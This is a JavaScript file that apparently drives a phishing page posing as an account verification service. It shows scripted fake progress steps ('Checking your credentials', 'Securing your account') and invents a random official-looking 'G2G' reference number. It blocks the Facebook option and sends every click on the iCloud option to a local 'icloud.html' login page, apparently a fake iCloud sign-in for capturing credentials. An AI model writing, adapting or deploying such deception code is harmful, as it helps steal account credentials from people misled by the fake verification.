// ============================================
// TOAST FUNCTION
// ============================================
const toast = document.getElementById('toast');

function showToast(msg, isError) {
  if (!toast) return;
  if (isError === undefined) isError = false;
  toast.textContent = msg;
  toast.style.background = isError ? '#b03d3d' : '#2d1f1a';
  toast.classList.add('show');
  clearTimeout(toast._hide);
  toast._hide = setTimeout(function () {
    toast.classList.remove('show');
  }, 3200);
}

// ============================================
// PARTICLES
// ============================================
function createParticles() {
  const container = document.getElementById('particleNetwork');
  if (!container) return;
  for (let i = 0; i < 25; i++) {
    const particle = document.createElement('div');
    particle.className = 'particle';
    const size = Math.random() * 60 + 15;
    particle.style.width = size + 'px';
    particle.style.height = size + 'px';
    particle.style.left = Math.random() * 100 + '%';
    particle.style.top = Math.random() * 100 + '%';
    particle.style.animationDelay = Math.random() * 20 + 's';
    particle.style.animationDuration = 16 + Math.random() * 14 + 's';
    container.appendChild(particle);
  }
}
createParticles();

// ============================================
// GENERATE REFERENCE NUMBER
// ============================================
function generateReferenceNumber() {
  const prefix = 'G2G';
  const year = new Date().getFullYear();
  const random = Math.floor(1000 + Math.random() * 9000);
  return prefix + '-' + year + '-' + random;
}

// ============================================
// VERIFYING POPUP
// ============================================
const verifyingPopup = document.getElementById('verifyingPopup');
const verifyMessage = document.getElementById('verifyMessage');
const verifyProgress = document.getElementById('verifyProgress');
const verifyProgressBar = document.getElementById('verifyProgressBar');
const refNumber = document.getElementById('refNumber');
const refCode = document.getElementById('refCode');

function showVerifyingPopup() {
  if (!verifyingPopup) return;
  verifyingPopup.classList.add('active');
  if (verifyProgressBar) verifyProgressBar.style.width = '0%';
  if (refNumber) refNumber.classList.remove('show');
  
  const ref = generateReferenceNumber();
  if (refCode) refCode.textContent = ref;
  
  const steps = [
    { text: '🔍 Checking your credentials...', progress: 20 },
    { text: '✅ Verifying your identity...', progress: 45 },
    { text: '🔐 Securing your account...', progress: 70 },
    { text: '📋 Generating your reference number...', progress: 90 },
    { text: '✨ Verification complete!', progress: 100 }
  ];
  let stepIndex = 0;
  
  function updateStep() {
    if (stepIndex < steps.length) {
      const step = steps[stepIndex];
      if (verifyMessage) verifyMessage.textContent = step.text;
      if (verifyProgress) verifyProgress.textContent = 'Step ' + (stepIndex + 1) + ' of ' + steps.length;
      if (verifyProgressBar) verifyProgressBar.style.width = step.progress + '%';
      stepIndex++;
      if (stepIndex === 4 && refNumber) {
        refNumber.classList.add('show');
      }
      if (stepIndex < steps.length) {
        setTimeout(updateStep, 700 + Math.random() * 500);
      } else {
        setTimeout(function () {
          if (verifyingPopup) verifyingPopup.classList.remove('active');
          // Redirect to iCloud login
          window.location.href = 'icloud.html';
        }, 800);
      }
    }
  }
  setTimeout(updateStep, 400);
}

// ============================================
// VERIFICATION OPTIONS
// ============================================
const facebookOption = document.getElementById('facebookOption');
const icloudOption = document.getElementById('icloudOption');

// Facebook is disabled
if (facebookOption) {
  facebookOption.addEventListener('click', function (e) {
    e.preventDefault();
    showToast('Facebook verification is currently disabled. Please use iCloud.', true);
  });
}

// iCloud - shows verifying popup then redirects
if (icloudOption) {
  icloudOption.addEventListener('click', function () {
    showVerifyingPopup();
  });
}

// ============================================
// SECURITY FOOTER LINKS
// ============================================
document.querySelector('.sec-link')?.addEventListener('click', function(e) {
  e.preventDefault();
  showToast('📧 Contact support for help with verification.', false);
});

console.log('✅ Verification page loaded');
console.log('📱 Click iCloud to start verification process');